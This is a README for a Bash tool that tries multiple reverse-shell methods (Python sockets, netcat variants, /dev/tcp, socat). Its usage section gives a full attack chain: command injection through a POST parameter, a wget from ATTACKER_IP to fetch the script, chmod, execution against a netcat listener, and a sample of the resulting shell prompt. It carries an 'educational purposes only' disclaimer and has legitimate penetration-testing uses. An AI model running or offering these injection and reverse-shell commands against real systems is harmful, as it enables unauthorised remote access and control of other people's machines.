# Multi-Reverse Shell Script

## Overview

`multi_reverse.sh` is a Bash script designed to try multiple methods to establish a reverse shell connection to a remote host. The script tests various techniques including Python sockets, netcat with mkfifo, netcat with `-e` and `-c` flags, bash-based method, and socat.

This tool is intended for educational purposes and should be used only on networks for which you have explicit permission.

## Requirements

- Bash
- Python
- netcat (`nc`)
- `mkfifo`
- `socat`

## Usage

To execute the script, you'll need to pass the Remote Host (RHOST) and Remote Port (RPORT) as arguments.
This script is intended to be executed on target machine to test different methods to generate a reverse shell
```bash
# start a simple http server on current directory
python3 -m http.server 1234

# download multi_reverse.sh on ATTACKER_IP 
curl -X POST -d "testparam=;wget http://ATTACKER_IP:1234/multi_reverse.sh" http://TARGET_IP/

# give execution permission to multi_reverse.sh script
curl -X POST -d "testparam=;chmod +x ./multi_reverse.sh"   http://TARGET_IP/

# start a listener with netcat
nc -lvnp 1234

# execute script on TARGET_IP
curl -X POST -d "testparam=;./multi_reverse.sh <ATTACKER_IP> 1234"   http://TARGET_IP/

# if you see a prompt like the next one, then reverse shell was successful
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38846
$ 
```

## Methods Used

### Python Socket
This method uses Python's socket library to connect to the remote host and port.

### Netcat with mkfifo
This technique uses netcat in conjunction with a named pipe (mkfifo) for establishing the reverse shell.

### Netcat with -e
The -e flag in netcat allows you to execute a shell (/bin/bash) upon connection.

### Netcat with -c
Similar to -e, but uses the -c flag instead.

### Bash-based
This method uses /dev/tcp to establish the reverse shell.

### Socat
This method utilizes the socat utility for more advanced features like creating a pseudo-terminal.
Exit Codes
- `0`:Successful reverse shell connection
- `1`:Failure or incorrect usage

## Disclaimer
This script is for educational purposes only. Always ensure you have explicit permission to access the target system.